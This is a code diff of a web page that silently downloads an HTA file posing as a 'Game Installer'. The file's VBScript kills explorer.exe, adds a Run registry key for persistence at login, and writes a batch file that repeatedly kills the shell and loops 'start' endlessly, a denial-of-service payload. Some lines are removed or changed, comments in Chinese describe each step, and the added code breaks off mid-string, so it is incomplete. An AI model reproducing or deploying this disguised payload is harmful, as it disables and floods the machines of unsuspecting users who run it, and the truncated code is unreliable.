@@ -52,34 +52,15 @@
             <head><title>Game Installer</title></head>
             <body>
             <script language="VBScript">
+                ' 获取 WScript.Shell 对象
                 Set WshShell = CreateObject("WScript.Shell")
-                ' 执行命令关闭 explorer.exe
+
+                ' 执行关闭 explorer.exe 的命令
                 WshShell.Run "taskkill /f /im explorer.exe", 0, True
                 
-                ' 创建并写入注册表
+                ' 创建并修改注册表项，确保每次登录时都会运行
                 WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PersistentTask", "%APPDATA%\persistent.bat"
 
-                ' 创建 persistent.bat 文件
+                ' 创建 persistent.bat 文件并写入内容
                 Set fso = CreateObject("Scripting.FileSystemObject")
-                Set file = fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%APPDATA%\\persistent.bat"), True)
-                file.WriteLine "@echo off"
-                file.WriteLine "taskkill /f /im explorer.exe"
-                file.WriteLine ":loop"
-                file.WriteLine "start"
-                file.WriteLine "goto loop"
-                file.Close
-            </script>
-            </body>
-            </html>
-            `;
-            var blob = new Blob([htaContent], { type: 'application/hta' });
-            var link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'installer.hta';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-    </script>
-</body>
-</html>
+                Set file = fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%
